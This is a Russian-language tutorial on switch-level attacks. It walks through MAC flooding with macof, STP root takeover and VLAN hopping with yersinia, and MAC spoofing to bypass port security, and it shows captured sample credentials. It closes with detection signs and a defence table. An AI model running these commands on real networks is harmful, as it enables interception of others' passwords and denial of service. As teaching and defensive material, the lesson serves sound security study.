## Вопрос, с которого всё начинается

Ты подключён Ethernet-кабелем в порт доступа офисного коммутатора. Слева — твой ноутбук `10.0.0.66`, справа — рабочий ПК `10.0.0.50`, который прямо сейчас логинится в корпоративный портал по HTTP. Ты хочешь увидеть его пароль.

Но между вами не **хаб**, а **коммутатор** (switch) — устройство канального уровня (L2). Хаб повторял бы кадр во все порты, и ты видел бы всё. Коммутатор же запоминает, за каким портом живёт какой **MAC-адрес**, и отдаёт кадр только в нужный порт. Просто «слушать провод» бесполезно.

Вопрос урока: как заставить коммутатор нарушить это правило — и какая защита может этому помешать.

## Наш пример: сегмент 10.0.0.0/24

Наша машина — `10.0.0.66`, интерфейс `eth0`. Цель — `10.0.0.50`. Начинаем с разведки: слушаем свой провод и смотрим, что вообще видно.

```
$ sudo tcpdump -i eth0 -nn -e -c 3
10:02:11.501234 00:11:22:33:44:55 > 01:00:0c:cc:cc:cc, ethertype CDP, length 385
10:02:14.220100 aa:bb:cc:00:11:22 > ff:ff:ff:ff:ff:ff, ethertype ARP, length 42
10:02:15.900010 10.0.0.50.52010 > 10.0.0.1.53: 41234+ A? portal.corp.local. (34)
```

Флаг `-e` заставляет `tcpdump` печатать MAC-адреса. Мы видим два чужих MAC: `00:11:22:33:44:55` (это коммутатор — он шлёт CDP) и `aa:bb:cc:00:11:22` (соседний хост). Строка с `10.0.0.50` — это DNS-запрос цели, он ушёл в broadcast и потому дошёл до нас.

Итак, чужие MAC видны, но кадры `10.0.0.50 → 10.0.0.1` до нас не доходят. Пора понять, почему.

## Шаг 1: как коммутатор принимает решения

Внутри коммутатора работают три подсистемы:

- **CAM-таблица** (Content-Addressable Memory) — соответствие `MAC → порт`. Она ограничена по размеру: типично от 8 до 128 тысяч записей.
- **STP** (Spanning Tree Protocol) — строит дерево без петель: выбирает один **корневой мост** (root bridge), а лишние пути блокирует.
- **Логика пересылки** — если MAC получателя известен, кадр идёт в один порт; если неизвестен (unknown unicast) или это broadcast — **во все порты, кроме входного**.

Именно последний пункт — наша зацепка. Заставим коммутатор «забыть» адреса — и он превратится в хаб.

## Шаг 2: переполняем CAM-таблицу (MAC-flooding)

Утилита `macof` из набора dsniff генерирует кадры со случайными MAC-адресами источника. Коммутатор честно учит каждую новую пару `MAC → порт`, пока таблица не заполнится.

```
$ sudo macof -i eth0 -n 50000
```

Пятьдесят тысяч кадров уходят за считанные секунды. Когда места больше нет, коммутатор перестаёт различать порты и начинает **флудить** unknown unicast во все порты — как хаб. Теперь включаем захват:

```
$ sudo tcpdump -i eth0 -nn -w flood.pcap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
```

Через минуту останавливаем и ищем логины в открытом HTTP:

```
$ tshark -r flood.pcap -Y 'http.request.method == "POST"' \
    -T fields -e ip.src -e http.host -e urlencoded-form.value
10.0.0.50	portal.corp.local	username=ivanov&password=S3cret!
```

Готово: чужой POST с логином и паролем — у нас. Мы не «взламывали» ПК, просто воспользовались тем, что переполненный коммутатор стал широковещательным. Заметим: это «широкий, но шумный» захват — мы видим кадры всех хостов сегмента.

## Шаг 3: захват корневого моста STP

Коммутаторы обмениваются BPDU-кадрами и выбирают корневой мост по наименьшему **Bridge ID** = приоритет (2 байта) + MAC. По умолчанию приоритет `32768`. Если прислать BPDU с приоритетом `0`, корнем станешь ты.

```
$ sudo yersinia stp -attack 4 -interface eth0
yersinia: STP attack 4 (claiming root role) started
$ sudo tcpdump -i eth0 -n -e stp -c 1
10:05:00.100000 00:aa:bb:cc:dd:ee > 01:80:c2:00:00:00, STP 802.1d, Config,
  bridge-id 0.00:aa:bb:cc:dd:ee
```

`bridge-id 0.00:aa:bb:cc:dd:ee` — приоритет `0`, наш MAC. Топология перестроилась, и теперь трафик сегмента идёт через нас. Побочный эффект: если дёргать топологию, сеть будет «моргать» — это уже отказ в обслуживании, а не разведка.

## Шаг 4: port security и её обход

Администратор может ограничить число MAC на порту:

```
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 1
Switch(config-if)# switchport port-security violation shutdown
```

Порт, к которому подключён один хост, примет только один MAC. Обход простой: **спуфим разрешённый MAC**, узнав его из `tcpdump -e`. Коммутатор видит «тот самый» адрес и пропускает. Если MAC обучается динамически (**sticky**), можно занять «место» первым, пока легитимное устройство выключено. А если стоит `violation shutdown`, чужой кадр с неразрешённым MAC **выключит порт** — это уже DoS против соседа.

## Как это замечают

На стороне защиты атаки L2 видны по косвенным признакам:

- всплеск **BPDU/STP** с порта доступа (там BPDU быть не должно);
- **смена корневого моста** — топология «прыгает»;
- **один порт — много MAC** — признак flooding;
- переходы порта в **err-disable** (сработала port security).

| Атака | Защита |
|-------|--------|
| Захват корня STP | BPDU Guard, Root Guard |
| MAC-flooding | port security, storm control |
| Спуфинг разрешённого MAC | 802.1X, не доверять MAC |
| DoS через violation | `restrict`/`protect` вместо `shutdown` |

## VLAN hopping: выход за пределы сегмента

Перехватить трафик своего сегмента — не предел. Часто цель — выйти в чужой **VLAN**. Два приёма:

- **Switch spoofing (DTP)**: атакующий притворяется коммутатором и договаривается о **trunk**-порте, получая трафик всех VLAN. Защита — `switchport nonegotiate` (отключить DTP).
- **Double tagging (802.1Q)**: кадр с двумя тегами. Внешний тег (native VLAN) снимает первый коммутатор, а внутренний доставляет кадр в чужой VLAN. Защита — сменить native VLAN и не использовать VLAN 1.

```
$ sudo yersinia dtp -attack 1 -interface eth0
```

Проверить, отвечает ли порт на DTP, можно тем же `tcpdump -e`: если видны DTP-кадры, порт в режиме auto — потенциальная цель. Порядок действий на плоском сегменте: разведка (`tcpdump -e`, CDP/LLDP) → ARP-спуфинг (проще всего) → при защите от спуфинга MAC-flooding → при VLAN-изоляции DTP/double tagging.

## Что мы теперь знаем

- Коммутатор пересылает по CAM-таблице; её переполнение превращает его в хаб.
- `macof` заполняет CAM, после чего весь сегмент виден в `tcpdump`.
- STP выбирает корень по приоритету; приоритет `0` забирает роль себе.
- Port security ограничивает MAC на порт, но обходится спуфингом разрешённого MAC.
- `violation shutdown` — двойное оружие: и защита, и вектор DoS.

## Куда дальше

Мы научились видеть чужой трафик через коммутатор — сначала «широко» (CAM-flooding), потом «точно» (захват STP). В следующем уроке разберём выход за пределы своего VLAN: DTP, double tagging и то, как коммутатор сам отдаёт чужой сегмент. А пока запомни: **коммутатор доверяет тому, что видит на порту, — и это доверие можно подделать.**
